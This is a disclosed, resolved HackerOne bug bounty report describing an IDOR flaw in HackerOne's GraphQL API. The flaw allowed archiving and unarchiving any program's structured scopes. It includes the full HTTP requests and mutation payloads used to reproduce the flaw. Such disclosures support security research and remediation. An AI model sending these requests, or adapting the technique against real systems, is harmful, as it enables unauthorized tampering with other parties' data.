---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1501611'
original_report_id: '1501611'
title: An attacker can archive and unarchive any structured scope object on HackerOne
team_handle: security
created_at: '2022-03-05T22:21:29.932Z'
disclosed_at: '2022-04-18T18:22:22.857Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 305
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
---

# An attacker can archive and unarchive any structured scope object on HackerOne

## Metadata

- HackerOne Report ID: 1501611
- Weakness: 
- Program: security
- Disclosed At: 2022-04-18T18:22:22.857Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Hello, I have discovered an IDOR vulnerability that allows the scope of any program to be archived. Scopes are used to give information about the valid scopes of a program. For example HackerOne has the following scopes:
https://hackerone.com
https://api.hackerone.com
...

### Steps To Reproduce

1. Obtain the structured_scope_id: 
This can be found by base64 encoding: gid://hackerone/StructuredScope/NUMBER
For example, if the number was 94773 , the structered_scope_id would be Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==
Or, it could be found by intercepting the response of the program profile page.

2. Send the Following Request:
``` 
POST /graphql HTTP/2
Host: hackerone.com
Content-Length: 388
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
Accept: */*
X-Auth-Token: AUTHTOKEN
Content-Type: application/json
Origin: https://hackerone.com
Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

{"operationName":"ArchiveScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation ArchiveScope($structured_scope_id: ID!) {\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
It is also possible to unarchive scopes of other programs with the following request.:
```
POST /graphql HTTP/2
Host: hackerone.com
Content-Length: 414
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
Accept: */*
X-Auth-Token: ████
Content-Type: application/json
Origin: https://hackerone.com
Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

{"operationName":"UnarchiveStructuredScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation UnarchiveStructuredScope($structured_scope_id: ID!) {\n  unarchiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
Even though the response will say no structured scope exists, the scope will be archived.
Replace the structured_scope_id with the scope you wish to target and the X-Auth-Token with your token.
I will provide an Mp4 PoC soon.

## Impact

An attacker could archive or unarchive all 90000+ scopes on HackerOne.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
